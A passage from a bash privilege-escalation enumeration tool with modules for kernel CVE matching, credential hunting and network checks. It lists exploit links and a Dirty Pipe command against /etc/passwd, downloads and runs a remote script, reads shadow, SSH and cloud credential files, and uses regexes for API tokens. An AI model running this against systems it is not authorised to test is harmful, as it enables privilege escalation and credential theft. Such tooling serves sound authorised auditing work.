KERNEL_EXPLOITS["CVE-2023-0179"]="5.5.0,6.2.0,Netfilter nft_payload Overflow,https://www.openwall.org/lists/oss-security/2023/01/26/7,Stack buffer overflow in the netfilter subsystem"
KERNEL_EXPLOITS["CVE-2023-0386"]="5.11.0,6.2.0,OverlayFS Privilege Escalation,https://github.com/xkaneiki/CVE-2023-0386,Linux kernel privilege escalation via overlayfs"
KERNEL_EXPLOITS["CVE-2023-22809"]="3.0.0,6.2.0,Sudo sudoedit Bypass,https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc,Sudo bypass vulnerability (affects sudo < 1.9.12p2)"
KERNEL_EXPLOITS["CVE-2023-4911"]="5.1.0,6.4.0,Looney Tunables,https://www.hackthebox.com/blog/CVE-2023-4911-Looney-tunables,Vulnerability in the glibc library"
KERNEL_EXPLOITS["CVE-2023-6546"]="4.0.0,6.6.0,GSM n_gsm Use-After-Free,https://starlabs.sg/advisories/23/23-6546/,Local escalation through the n_gsm line discipline"

# Function to check the system's kernel version and compare with exploits
check_kernel_exploits() {
  print_subtitle "Kernel Exploit Detection"

  # Get kernel version
  kernel_version=$(uname -r)
  print_info "Current kernel version: $kernel_version"

  # Check if the kernel version is in a format we can parse
  if ! echo "$kernel_version" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+'; then
    print_warning "Unusual kernel version format, exploit detection might be less accurate"
  fi

  # Extract major, minor and patch version
  kernel_major=$(echo "$kernel_version" | cut -d. -f1)
  kernel_minor=$(echo "$kernel_version" | cut -d. -f2)
  kernel_patch=$(echo "$kernel_version" | cut -d. -f3 | cut -d- -f1)

  # Convert to comparable format
  kernel_num=$((kernel_major * 10000 + kernel_minor * 100 + kernel_patch))

  # Counter for found exploits
  found_exploits=0

  # Check each exploit
  print_info "Checking for known kernel vulnerabilities..."

  for cve in "${!KERNEL_EXPLOITS[@]}"; do
    # Split the exploit data
    IFS=',' read -r min_version max_version name exploit_url description <<< "${KERNEL_EXPLOITS[$cve]}"

    # Skip if not applicable to standard kernels
    if [[ "$min_version" == "N/A" ]]; then
      # Special case for container-specific exploits
      if [[ "$cve" == "CVE-2019-5736" ]] && ( [ -f /.dockerenv ] || grep -q "docker\|lxc" /proc/1/cgroup 2>/dev/null ); then
        print_critical "${RED}[!] $cve - $name${NC} (Container Escape)"
        print_critical "    ${RED}→ Affects: Docker/Kubernetes containers${NC}"
        print_critical "    ${RED}→ Description: $description${NC}"
        print_critical "    ${RED}→ Exploit: $exploit_url${NC}"
        found_exploits=$((found_exploits + 1))
      fi
      continue
    fi

    # Parse min version (strip non-numeric suffixes, default missing fields to 0)
    min_major=$(echo "$min_version" | cut -d. -f1 | tr -dc '0-9')
    min_minor=$(echo "$min_version" | cut -d. -f2 | tr -dc '0-9')
    min_patch=$(echo "$min_version" | cut -d. -f3 | tr -dc '0-9')
    min_major=${min_major:-0}; min_minor=${min_minor:-0}; min_patch=${min_patch:-0}

    # Parse max version
    max_major=$(echo "$max_version" | cut -d. -f1 | tr -dc '0-9')
    max_minor=$(echo "$max_version" | cut -d. -f2 | tr -dc '0-9')
    max_patch=$(echo "$max_version" | cut -d. -f3 | tr -dc '0-9')
    max_major=${max_major:-0}; max_minor=${max_minor:-0}; max_patch=${max_patch:-0}

    # Skip if versions could not be parsed to numbers
    if ! [[ "$min_major" =~ ^[0-9]+$ ]] || ! [[ "$max_major" =~ ^[0-9]+$ ]]; then
      continue
    fi

    min_num=$((min_major * 10000 + min_minor * 100 + min_patch))
    max_num=$((max_major * 10000 + max_minor * 100 + max_patch))

    # Check if kernel version is in vulnerable range
    if [ "$kernel_num" -ge "$min_num" ] && [ "$kernel_num" -le "$max_num" ]; then
      # Confirm by checking additional conditions

      # Check for Dirty Pipe specific conditions
      if [[ "$cve" == "CVE-2022-0847" ]]; then
        # Extra check for specific kernel configs
        if grep -q "CONFIG_PIPE=y" /boot/config-$(uname -r) 2>/dev/null; then
          print_critical "${RED}[!] $cve - $name${NC} (High Probability)"
          print_critical "    ${RED}→ Affects: Linux kernel $min_version-$max_version${NC}"
          print_critical "    ${RED}→ Description: $description${NC}"
          print_critical "    ${RED}→ Exploit: $exploit_url${NC}"
          print_critical "    ${RED}→ POC Command: echo 'Dirty Pipe Test' | ./cve-2022-0847 /etc/passwd 1${NC}"
          found_exploits=$((found_exploits + 1))
        else
          print_warning "${YELLOW}[!] $cve - $name${NC} (Needs Verification)"
          print_warning "    ${YELLOW}→ Affects: Linux kernel $min_version-$max_version${NC}"
          print_warning "    ${YELLOW}→ Description: $description${NC}"
          print_warning "    ${YELLOW}→ Need to verify CONFIG_PIPE is enabled${NC}"
        fi
        continue
      fi

      # Check for Polkit specific conditions
      if [[ "$cve" == "CVE-2021-4034" ]] || [[ "$cve" == "CVE-2021-3560" ]]; then
        if command_exists pkexec || [ -f "/usr/bin/pkexec" ]; then
          pkexec_version=$(pkexec --version 2>/dev/null | head -n1)
          print_critical "${RED}[!] $cve - $name${NC} (High Probability)"
          print_critical "    ${RED}→ Affects: Polkit (pkexec: $pkexec_version)${NC}"
          print_critical "    ${RED}→ Description: $description${NC}"
          print_critical "    ${RED}→ Exploit: $exploit_url${NC}"
          found_exploits=$((found_exploits + 1))
        else
          print_warning "${YELLOW}[!] $cve - $name${NC} (May Not Apply)"
          print_warning "    ${YELLOW}→ pkexec not found, vulnerability may not apply${NC}"
        fi
        continue
      fi

      # Check for Sudo specific vulnerabilities
      if [[ "$cve" == "CVE-2021-3156" ]] || [[ "$cve" == "CVE-2019-18634" ]] || [[ "$cve" == "CVE-2023-22809" ]]; then
        if command_exists sudo; then
          sudo_version=$(sudo -V 2>/dev/null | head -n1 | awk '{print $3}')

          if [[ "$cve" == "CVE-2021-3156" ]] && [[ "$sudo_version" < "1.9.5p2" ]]; then
            print_critical "${RED}[!] $cve - $name${NC} (Confirmed)"
            print_critical "    ${RED}→ Affects: sudo versions before 1.9.5p2 (found: $sudo_version)${NC}"
            print_critical "    ${RED}→ Description: $description${NC}"
            print_critical "    ${RED}→ Exploit: $exploit_url${NC}"
            found_exploits=$((found_exploits + 1))
          elif [[ "$cve" == "CVE-2019-18634" ]] && [[ "$sudo_version" < "1.8.31" ]]; then
            # Check if pwfeedback is enabled
            if grep -q "pwfeedback" /etc/sudoers 2>/dev/null; then
              print_critical "${RED}[!] $cve - $name${NC} (Confirmed)"
              print_critical "    ${RED}→ Affects: sudo versions before 1.8.31 with pwfeedback enabled${NC}"
              print_critical "    ${RED}→ Description: $description${NC}"
              print_critical "    ${RED}→ Exploit: $exploit_url${NC}"
              found_exploits=$((found_exploits + 1))
            else
              print_warning "${YELLOW}[!] $cve - $name${NC} (Vulnerable version but pwfeedback not enabled)"
            fi
          elif [[ "$cve" == "CVE-2023-22809" ]] && [[ "$sudo_version" < "1.9.12p1" ]]; then
            print_critical "${RED}[!] $cve - $name${NC} (Potential)"
            print_critical "    ${RED}→ Affects: sudo versions before 1.9.12p1 (found: $sudo_version)${NC}"
            print_critical "    ${RED}→ Description: $description${NC}"
            print_critical "    ${RED}→ Exploit: $exploit_url${NC}"
            found_exploits=$((found_exploits + 1))
          fi
        fi
        continue
      fi

      # Default case - just report the vulnerability
      print_warning "${YELLOW}[!] $cve - $name${NC} (Potential)"
      print_warning "    ${YELLOW}→ Affects: Linux kernel $min_version-$max_version${NC}"
      print_warning "    ${YELLOW}→ Description: $description${NC}"
      print_warning "    ${YELLOW}→ Exploit: $exploit_url${NC}"
      found_exploits=$((found_exploits + 1))
    fi
  done

  # Check for presence of exploit mitigation features
  print_info "Checking for kernel hardening features..."

  # Check for SMEP (Supervisor Mode Execution Prevention)
  smep_enabled=$(grep -i "smep" /proc/cpuinfo 2>/dev/null)
  if [ -n "$smep_enabled" ]; then
    print_success "SMEP (Supervisor Mode Execution Prevention) is enabled"
  else
    print_warning "SMEP doesn't appear to be enabled - kernel exploits may be easier"
  fi

  # Check for SMAP (Supervisor Mode Access Prevention)
  smap_enabled=$(grep -i "smap" /proc/cpuinfo 2>/dev/null)
  if [ -n "$smap_enabled" ]; then
    print_success "SMAP (Supervisor Mode Access Prevention) is enabled"
  else
    print_warning "SMAP doesn't appear to be enabled - kernel exploits may be easier"
  fi

  # Check for KAISER/KPTI (Kernel Page Table Isolation)
  kpti_enabled=$(grep -i "pti" /proc/cpuinfo 2>/dev/null)
  if [ -n "$kpti_enabled" ]; then
    print_success "KPTI (Kernel Page Table Isolation) is enabled"
  else
    print_warning "KPTI doesn't appear to be enabled - Meltdown attacks may be possible"
  fi

  # Report summary
  if [ "$found_exploits" -gt 0 ]; then
    print_critical "Found $found_exploits potential kernel vulnerabilities!"
  else
    print_success "No known kernel vulnerabilities detected."
  fi
}

# Add Linux Exploit Suggester integration
run_linux_exploit_suggester() {
  print_subtitle "Linux Exploit Suggester"

  print_info "Running Linux Exploit Suggester for comprehensive checks..."

  # Create temp directory
  temp_dir=$(create_temp_dir)

  # Try to download and run Linux Exploit Suggester
  if command_exists curl || command_exists wget; then
    les_url="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"

    if command_exists curl; then
      curl -s "$les_url" -o "$temp_dir/les.sh" 2>/dev/null
    else
      wget -q "$les_url" -O "$temp_dir/les.sh" 2>/dev/null
    fi

    if [ -f "$temp_dir/les.sh" ]; then
      chmod +x "$temp_dir/les.sh"
      print_info "Running Linux Exploit Suggester..."
      les_output=$("$temp_dir/les.sh" 2>/dev/null)

      # Extract and highlight CVEs
      if [ -n "$les_output" ]; then
        echo "$les_output" | grep -E "CVE-[0-9]+-[0-9]+" | grep -i "kernel" | sed -e "s/\(CVE-[0-9]\+-[0-9]\+\)/${RED}\1${NC}/g"
      else
        print_warning "Linux Exploit Suggester didn't return any results"
      fi
    else
      print_warning "Failed to download Linux Exploit Suggester"
    fi

    # Clean up
    rm -rf "$temp_dir"
  else
    print_warning "curl or wget is required to download Linux Exploit Suggester"
  fi
}

# Run integration with additional exploit detectors
run_additional_exploit_checks() {
  print_subtitle "Additional Kernel Checks"

  # Check for Dirty COW (CVE-2016-5195)
  if [ "$kernel_major" -eq 2 ] || ( [ "$kernel_major" -eq 3 ] && [ "$kernel_minor" -lt 19 ] ) || \
    ( [ "$kernel_major" -eq 4 ] && [ "$kernel_minor" -lt 9 ] ); then
    print_critical "${RED}[!] System is vulnerable to Dirty COW (CVE-2016-5195)!${NC}"
    print_critical "    ${RED}→ Affects: Linux kernel versions before 3.19.0 and 4.9.0${NC}"
    print_critical "    ${RED}→ Description: Race condition in mm/gup.c allowing local privilege escalation${NC}"
    print_critical "    ${RED}→ Exploit: https://github.com/firefart/dirtycow${NC}"
  fi

  # Check for BlueZ vulnerability (CVE-2021-3573)
  if command_exists bluetoothd; then
    bluez_version=$(bluetoothd -v 2>/dev/null)
    if [ -n "$bluez_version" ]; then
      if [[ "$bluez_version" < "5.63" ]]; then
        print_warning "${YELLOW}[!] BlueZ version $bluez_version may be vulnerable to CVE-2021-3573${NC}"
        print_warning "    ${YELLOW}→ Affects: BlueZ before 5.63${NC}"
        print_warning "    ${YELLOW}→ Description: NULL pointer dereference in the AVDTP implementation${NC}"
      fi
    fi
  fi

  # Check for eBPF vulnerabilities
  if [ -d "/sys/fs/bpf" ] || [ -d "/proc/sys/net/core/bpf_jit_enable" ]; then
    bpf_jit_enabled=$(cat /proc/sys/net/core/bpf_jit_enable 2>/dev/null)
    if [ "$bpf_jit_enabled" = "1" ]; then
      print_warning "${YELLOW}[!] BPF JIT compiler is enabled, this can be used for exploits${NC}"
      print_warning "    ${YELLOW}→ Check for CVE-2020-8835, CVE-2020-27194, and others${NC}"
    else
      print_success "BPF JIT compiler is disabled"
    fi
  fi
}

# Main function to run all kernel exploit checks
kernel_exploit_checks() {
  print_title "Kernel Vulnerabilities"

  # Run primary kernel exploit check
  check_kernel_exploits

  # Run Linux Exploit Suggester if in thorough mode
  if [ "$THOROUGH" ]; then
    run_linux_exploit_suggester
  fi

  # Run additional specialized exploit checks
  run_additional_exploit_checks

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/credentials/credentials_hunter.sh ---

# Title: Credentials Hunter
# Description: Search for passwords, API keys, and sensitive information throughout the system
# Author: Jonas Resch

# Define credential patterns with improved accuracy
# Format: "name|regex_pattern|context_lines|critical"
CREDENTIAL_PATTERNS=(
  "AWS Access Key|AKIA[0-9A-Z]{16}|2|1"
  "AWS Secret Key|[0-9a-zA-Z/+]{40}|2|1"
  "SSH Private Key|-----BEGIN( RSA| OPENSSH| DSA| EC)?\\s?PRIVATE KEY|5|1"
  "PGP Private Key|-----BEGIN PGP PRIVATE|5|1"
  "Google API Key|AIza[0-9A-Za-z_-]{35}|2|1"
  "Google OAuth|[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com|2|1"
  "Slack Token|xox[pbar]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}|2|1"
  "GitHub Token|gh[ps]_[0-9a-zA-Z]{36}|2|1"
  "Basic Auth|Authorization:\\s*Basic\\s+[a-zA-Z0-9+/=]{5,100}|2|1"
  "Bearer Token|Authorization:\\s*Bearer\\s+[a-zA-Z0-9_\\.-]+|2|1"
  "API Key|['\"](api[_-]?key|apikey)['\"]:?\\s*['\"]((?!placeholder|example|your-api-key)[a-zA-Z0-9_\\.-]{10,64})['\"]|2|1"
  "MongoDB Connection|mongodb(\\+srv)?://[^@]+@[a-zA-Z0-9.-]+|3|1"
  "JWT Token|eyJ[a-zA-Z0-9_-]{10,}\\.eyJ[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{10,}|2|1"
  "Firebase URL|https?://[a-zA-Z0-9-]+\\.firebaseio\\.com|2|1"
  "Azure Storage Key|DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[a-zA-Z0-9+/=]{40,}|2|1"
  "Private Key File|\\.(key|pem|ppk|p12|pfx|jks|keystore)$|0|1"
)

# List of common credential file locations - prioritized and more specific
CREDENTIAL_FILES=(
  "/etc/shadow"
  "/etc/passwd"
  "/etc/sudoers"
  "/etc/sudoers.d/*"
  "/root/.ssh/id_*"
  "/root/.aws/credentials"
  "/root/.aws/config"
  "/home/*/.ssh/id_*"
  "/home/*/.ssh/authorized_keys"
  "/home/*/.aws/credentials"
  "/home/*/.aws/config"
  "/home/*/.git-credentials"
  "/home/*/.docker/config.json"
  "/home/*/.kube/config"
  "/home/*/.terraform.d/credentials*"
  "/var/www/*/.env"
  "/var/www/*/wp-config.php"
  "/var/www/*/config.php"
  "/var/lib/jenkins/credentials.xml"
  "/var/lib/jenkins/secrets/master.key"
  "/docker-compose*.y*ml"
  "/.env"
  "./*.env"
  "/tmp/testcreds.sh"       # Added for testing
  "/tmp/*.sh"               # Added for testing
)

# Excluded paths for credential searches
EXCLUDED_PATHS=(
  "/usr/share"
  "/usr/lib"
  "/lib"
  "/lib64"
  "/var/lib"
  "/var/cache"
  "/var/log"
  "/.cursor"
  "/.local/share/Trash"
  "/.cache"
  "/.config/google-chrome"
  "/.config/chromium"
  "/.config/BraveSoftware"
  "/.mozilla"
  "/EscalateX"
  "/proc"
  "/sys"
  "/run"
  "/dev"
  "/var/tmp"
  "/tmp"
  "node_modules"
  "venv"
  ".venv"
  "__pycache__"
  ".npm"
  ".gradle"
  ".m2"
)

# File size threshold in bytes (1MB)
MAX_FILE_SIZE=1048576

# Build excluded paths argument for find command
build_exclusion_args() {
  local excl_args=""
  for path in "${EXCLUDED_PATHS[@]}"; do
    excl_args="$excl_args -path \"*$path*\" -o "
  done
  # Remove the trailing "-o " and add "-prune -o " at the end
  excl_args=$(echo "$excl_args" | sed 's/ -o $//g')
  echo "$excl_args -prune -o"
}

# Function to mask sensitive data
mask_sensitive_data() {
  local input="$1"
  # Mask passwords, keys, tokens while preserving variable names
  echo "$input" | sed -E 's/(password|token|secret|key|credentials)[=:]["'"'"']?([^"'"'"' :]+)/\1=********/gi'
}

# Scan for files containing credentials
check_credential_files() {
  print_subtitle "Critical Credential Files"

  print_info "Scanning for sensitive credential files..."

  # Process each file pattern from CREDENTIAL_FILES
  for file_pattern in "${CREDENTIAL_FILES[@]}"; do
    # Handle wildcard patterns
    if [[ "$file_pattern" == *"*"* ]]; then
      # Use eval to properly expand the glob pattern
      eval "files=($file_pattern)"
      for file in "${files[@]}"; do
        if [ -f "$file" ] && [ -r "$file" ]; then
          check_credential_file "$file"
        fi
      done
    else
      # Regular file
      if [ -f "$file_pattern" ] && [ -r "$file_pattern" ]; then
        check_credential_file "$file_pattern"
      fi
    fi
  done
}

# Helper function to check a single credential file
check_credential_file() {
  local file="$1"

  # Skip if file is too large
  local file_size=$(stat -c%s "$file" 2>/dev/null || echo "0")
  if [ "$file_size" -gt "$MAX_FILE_SIZE" ]; then
    print_warning "Skipping large file: $file ($(( file_size / 1024 )) KB)"
    return
  fi

  # Skip binary files
  if file "$file" | grep -q "binary"; then
    return
  fi

  # Analyze file based on its type
  case "$file" in
    *"/shadow")
      print_critical "Found shadow password file: ${RED}$file${NC}"
      grep -v '^[^:]*:[*!]' "$file" 2>/dev/null | head -n 5 | grep ":" | while read -r line; do
        user=$(echo "$line" | cut -d: -f1)
        print_critical "  ${RED}→ User '$user' has password hash${NC}"
      done
      ;;

    *"/id_rsa"|*"/id_dsa"|*"/id_ecdsa"|*"/id_ed25519")
      print_critical "Found SSH private key: ${RED}$file${NC}"
      local key_header=$(head -n 1 "$file" 2>/dev/null)
      local key_owner=$(stat -c "%U" "$file" 2>/dev/null)
      print_critical "  ${RED}→ Type: $key_header${NC}"
      print_critical "  ${RED}→ Owner: $key_owner${NC}"
      print_critical "  ${RED}→ Permissions: $(stat -c "%a" "$file" 2>/dev/null)${NC}"
      ;;

    *"/aws/credentials"|*"/.aws/config")
      print_critical "Found AWS credentials: ${RED}$file${NC}"
      grep -A 2 -B 1 "aws_" "$file" 2>/dev/null | grep -v "^--$" | while read -r line; do
        masked_line=$(mask_sensitive_data "$line")
        print_critical "  ${RED}→ $masked_line${NC}"
      done
      ;;

    *"/.kube/config")
      print_critical "Found Kubernetes config: ${RED}$file${NC}"
      grep -A 1 "token:" "$file" 2>/dev/null | grep -v "^--$" | while read -r line; do
        masked_line=$(mask_sensitive_data "$line")
        print_critical "  ${RED}→ $masked_line${NC}"
      done
      ;;

    *"wp-config.php"|*"config.php")
      print_critical "Found PHP configuration with credentials: ${RED}$file${NC}"
      grep -E "(DB_PASSWORD|password|NONCE|SALT|KEY)" "$file" 2>/dev/null | grep -v "//" | head -n 5 | while read -r line; do
        masked_line=$(mask_sensitive_data "$line")
        print_critical "  ${RED}→ $masked_line${NC}"
      done
      ;;

    *"/.env"|*"docker-compose"*)
      print_critical "Found environment file with credentials: ${RED}$file${NC}"
      grep -E "(PASSWORD|SECRET|TOKEN|KEY|CREDENTIAL)" "$file" 2>/dev/null | grep -v "^#" | head -n 5 | while read -r line; do
        masked_line=$(mask_sensitive_data "$line")
        print_critical "  ${RED}→ $masked_line${NC}"
      done
      ;;

    "/tmp/testcreds.sh"|*"/tmp/*.sh")
      # Special handling for our test file or other scripts
      if grep -q -E "AWS_|TOKEN|SECRET|PASSWORD|CREDENTIAL" "$file" 2>/dev/null; then
        print_critical "Found credentials in shell script: ${RED}$file${NC}"
        grep -E "AWS_|TOKEN|SECRET|PASSWORD|CREDENTIAL" "$file" 2>/dev/null | while read -r line; do
          masked_line=$(mask_sensitive_data "$line")
          print_critical "  ${RED}→ $masked_line${NC}"
        done
      fi
      ;;

    *)
      # Generic sensitive file detection
      print_warning "Found potential credential file: ${YELLOW}$file${NC}"
      grep -E "(password|secret|token|key|credential|user|login)" "$file" 2>/dev/null | grep -v "^#" | head -n 3 | while read -r line; do
        masked_line=$(mask_sensitive_data "$line")
        print_warning "  ${YELLOW}→ $masked_line${NC}"
      done
      ;;
  esac
}

# Scan for credentials in history files
check_history_files() {
  print_subtitle "Shell History Analysis"

  print_info "Checking shell history files for credentials..."

  # History files to check
  local history_files=(
    "$HOME/.bash_history"
    "$HOME/.zsh_history"
    "$HOME/.history"
    "$HOME/.mysql_history"
    "$HOME/.psql_history"
  )

  # Strong patterns for credential commands - more specific to reduce false positives
  local history_patterns=(
    "[-][-]password=[^ ]+"
    "curl.*[-]u .*:.*"
    "wget.*[-][-]password=[^ ]+"
    "mysql .*[-]p[a-zA-Z0-9]+"
    "psql .*[-]W.*password"
    "sshpass [-]p [^ ]+"
    "git clone https://[^@]+:[^@]+@"
    "git push https://[^@]+:[^@]+@"
    "export +[A-Z_]*TOKEN=[^ ]+"
    "export +[A-Z_]*SECRET=[^ ]+"
    "export +[A-Z_]*PASSWORD=[^ ]+"
    "export +[A-Z_]*KEY=[^ ]+"
    "aws configure set aws_access_key_id"
    "aws configure set aws_secret_access_key"
    "aws .* --secret"
    "openssl .* -pass"
    "heroku auth:token"
    "gh auth login"
    "htpasswd [-]b .* [^ ]+"
  )

  # List of patterns to exclude as false positives
  local false_positive_patterns=(
    "github.com/[^:]+$"
    "gitlab.com/[^:]+$"
    "bitbucket.org/[^:]+$"
    "password-stdin"
    "echo.*password"
    "password="
    "SECRET=dummy"
  )

  for file in "${history_files[@]}"; do
    if [ -r "$file" ]; then
      print_warning "Found history file: ${YELLOW}$file${NC}"

      # Build regex pattern for grep
      local pattern=$(echo "${history_patterns[@]}" | tr ' ' '|')

      # Find matching lines
      found_creds=0
      grep -n -E "$pattern" "$file" 2>/dev/null | head -n 20 | while read -r line; do
        line_num=${line%%:*}
        line_content=${line#*:}

        # Skip if line is too short or just a command name
        if [ ${#line_content} -lt 10 ] || echo "$line_content" | grep -qE "^(curl|wget|mysql|psql|ssh|git)$"; then
          continue
        fi

        # Check for false positives
        is_false_positive=0
        for fp in "${false_positive_patterns[@]}"; do
          if echo "$line_content" | grep -q "$fp"; then
            is_false_positive=1
            break
          fi
        done

        # Skip basic git clones without credentials
        if echo "$line_content" | grep -qE "^git clone https://github.com/|^git clone https://gitlab.com/"; then
          # Only skip if it doesn't have credentials in the URL
          if ! echo "$line_content" | grep -qE "@github.com|@gitlab.com"; then
            is_false_positive=1
          fi
        fi

        if [ $is_false_positive -eq 0 ]; then
          # Check if command looks like it has sensitive data
          if echo "$line_content" | grep -qiE "(password|token|secret|key|pass|cred|auth|login)"; then
            # Mask sensitive information
            masked_line=$(mask_sensitive_data "$line_content")
            print_warning "Found credential command in history (line $line_num): ${YELLOW}$masked_line${NC}"
            found_creds=1
          elif echo "$line_content" | grep -qE -- "-p[^ ]|--password="; then
            # Commands with password params
            masked_line=$(mask_sensitive_data "$line_content")
            print_warning "Found credential command in history (line $line_num): ${YELLOW}$masked_line${NC}"
            found_creds=1
          fi
        fi
      done

      # Check if any real credentials were found
      if [ $found_creds -eq 0 ]; then
        print_success "No obvious credentials found in history file."
      fi
    fi
  done
}

# Scan for database credentials
check_db_credentials() {
  print_subtitle "Database Credentials"

  print_info "Searching for database credentials..."

  # Check for MySQL credentials in common locations
  local mysql_conf_files=(
    "/etc/mysql/my.cnf"
    "/etc/my.cnf"
    "$HOME/.my.cnf"
    "/var/www/*/.my.cnf"
  )

  for pattern in "${mysql_conf_files[@]}"; do
    # Handle wildcard patterns
    if [[ "$pattern" == *"*"* ]]; then
      eval "files=($pattern)"
      for file in "${files[@]}"; do
        if [ -f "$file" ] && [ -r "$file" ]; then
          print_warning "Found MySQL configuration: ${YELLOW}$file${NC}"
          grep -E "^[[:space:]]*(user|password|host)" "$file" 2>/dev/null | grep -v "^#" | while read -r line; do
            masked_line=$(mask_sensitive_data "$line")
            print_critical "  ${RED}→ $masked_line${NC}"
          done
        fi
      done
    else
      if [ -f "$pattern" ] && [ -r "$pattern" ]; then
        print_warning "Found MySQL configuration: ${YELLOW}$pattern${NC}"
        grep -E "^[[:space:]]*(user|password|host)" "$pattern" 2>/dev/null | grep -v "^#" | while read -r line; do
          masked_line=$(mask_sensitive_data "$line")
          print_critical "  ${RED}→ $masked_line${NC}"
        done
      fi
    fi
  done

  # PostgreSQL credentials
  local pgpass_files=(
    "/var/lib/pgsql/.pgpass"
    "/var/lib/postgresql/.pgpass"
    "$HOME/.pgpass"
  )

  for file in "${pgpass_files[@]}"; do
    if [ -f "$file" ] && [ -r "$file" ]; then
      print_critical "Found PostgreSQL password file: ${RED}$file${NC}"
      cat "$file" 2>/dev/null | head -n 5 | while read -r line; do
        # Format: hostname:port:database:username:password
        # Only display hostname, database and username, mask the password
        if [ -n "$line" ] && [[ "$line" == *":"* ]]; then
          host=$(echo "$line" | cut -d: -f1)
          db=$(echo "$line" | cut -d: -f3)
          user=$(echo "$line" | cut -d: -f4)
          print_critical "  ${RED}→ Host: $host, DB: $db, User: $user, Password: ********${NC}"
        else
          print_critical "  ${RED}→ $line${NC}"
        fi
      done
    fi
  done

  # MongoDB credentials
  find "/etc" -maxdepth 2 -name "mongodb*.conf" 2>/dev/null | while read -r file; do
    if [ -r "$file" ]; then
      print_warning "Found MongoDB configuration: ${YELLOW}$file${NC}"
      grep -E "^[[:space:]]*(auth|security.authorization|setParameter.authenticationMechanisms)" "$file" 2>/dev/null | while read -r line; do
        print_warning "  ${YELLOW}→ $line${NC}"
      done
    fi
  done
}

# Scan for cloud credentials
check_cloud_credentials() {
  print_subtitle "Cloud Service Credentials"

  print_info "Searching for cloud service credentials..."

  # AWS credentials
  if [ -d "$HOME/.aws" ]; then
    aws_files=$(find "$HOME/.aws" -type f -name "credentials" -o -name "config" 2>/dev/null)
    if [ -n "$aws_files" ]; then
      print_critical "Found AWS credential files:"
      echo "$aws_files" | while read -r file; do
        if [ -r "$file" ]; then
          print_critical "  ${RED}→ $file${NC}"
          # Look for profiles
          grep -E "^\[" "$file" 2>/dev/null | while read -r profile; do
            print_critical "    ${RED}→ Profile: $profile${NC}"
          done
          # Look for access keys (only show partially masked)
          if grep -q "aws_access_key_id" "$file" 2>/dev/null; then
            access_keys=$(grep -E "aws_access_key_id" "$file" 2>/dev/null | sed -E 's/.*aws_access_key_id[[:space:]]*=[[:space:]]*([A-Z0-9]+).*/\1/')
            for key in $access_keys; do
              # Show first 4 and last 4 characters, mask the middle
              if [ ${#key} -gt 8 ]; then
                start=${key:0:4}
                end=${key: -4}
                masked="${start}****${end}"
                print_critical "    ${RED}→ Access Key: ${masked}${NC}"
              fi
            done
          fi
        fi
      done
    else
      print_success "AWS credentials directory exists but no credential files found."
    fi
  else
    print_success "No AWS credentials directory found."
  fi

  # GCP credentials
  if [ -d "$HOME/.config/gcloud" ]; then
    gcp_files=$(find "$HOME/.config/gcloud" -type f -name "application_default_credentials.json" -o -name "legacy_credentials" -o -name "*adc.json" 2>/dev/null)
    if [ -n "$gcp_files" ]; then
      print_critical "Found Google Cloud credential files:"
      echo "$gcp_files" | while read -r file; do
        if [ -r "$file" ]; then
          print_critical "  ${RED}→ $file${NC}"
          # Check if it contains oauth2_access_token or client_id
          if grep -q -E "\"oauth2_access_token\"|\"client_id\"" "$file" 2>/dev/null; then
            print_critical "    ${RED}→ Contains authentication tokens!${NC}"
          fi
        fi
      done
    else
      print_success "Google Cloud credentials directory exists but no credential files found."
    fi
  else
    print_success "No Google Cloud credentials directory found."
  fi

  # Azure credentials
  if [ -d "$HOME/.azure" ]; then
    azure_files=$(find "$HOME/.azure" -type f -name "accessTokens.json" -o -name "azureProfile.json" 2>/dev/null)
    if [ -n "$azure_files" ]; then
      print_critical "Found Azure credential files:"
      echo "$azure_files" | while read -r file; do
        if [ -r "$file" ]; then
          print_critical "  ${RED}→ $file${NC}"
          # Check for token information
          if grep -q -E "\"accessToken\"|\"refreshToken\"" "$file" 2>/dev/null; then
            print_critical "    ${RED}→ Contains authentication tokens!${NC}"
          fi
        fi
      done
    else
      print_success "Azure credentials directory exists but no credential files found."
    fi
  else
    print_success "No Azure credentials directory found."
  fi
}

# Main function: run all credential checks
credentials_hunter_main() {
  print_title "Credentials Hunter"

  # Check for potentially exposed passwords
  check_credential_files

  # Check history files
  check_history_files

  # Check for database credentials
  check_db_credentials

  # Check for cloud service credentials
  check_cloud_credentials

  # Wait for user if wait mode is enabled
  wait_for_user
}

# Call the main function if this script is executed directly

# --- modules/network_info/network_checks.sh ---

# Title: Network Information and Vulnerability Checker
# Description: Check for network misconfigurations and potential lateral movement vectors
# Author: Jonas Resch

check_network_interfaces() {
  print_subtitle "Network Interfaces"

  print_info "Checking network interfaces and configurations..."

  # Get all network interfaces
  if command_exists ip; then
    interfaces=$(ip -o link show | awk -F': ' '{print $2}')

    if [ -n "$interfaces" ]; then
      print_success "Found $(echo "$interfaces" | wc -l) network interfaces:"

      echo "$interfaces" | while read -r interface; do
        # Get IP address
        ip_addr=$(ip -o -4 addr show "$interface" 2>/dev/null | awk '{print $4}')
        ip_addr6=$(ip -o -6 addr show "$interface" 2>/dev/null | awk '{print $4}' | grep -v "fe80")

        # Get interface state
        state=$(ip -o link show "$interface" | awk '{print $9}')

        # Get MAC address
        mac=$(ip -o link show "$interface" | awk '{print $15}' | grep -E "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}")
        if [ -z "$mac" ]; then
          mac=$(ip -o link show "$interface" | awk '{print $17}' | grep -E "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}")
        fi

        # Print interface info
        if [ -n "$ip_addr" ]; then
          print_success " ${CYAN}$interface${NC}: $ip_addr [$state] [$mac]"

          # Check for internal IPs on external interfaces
          if [[ "$interface" =~ ^(eth|en|wl) ]] && [[ "$ip_addr" =~ ^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.) ]]; then
            print_warning "   ${YELLOW}→ Private IP detected on potentially external interface${NC}"
          fi
        elif [ -n "$ip_addr6" ]; then
          print_success " ${CYAN}$interface${NC}: $ip_addr6 [$state] [$mac]"
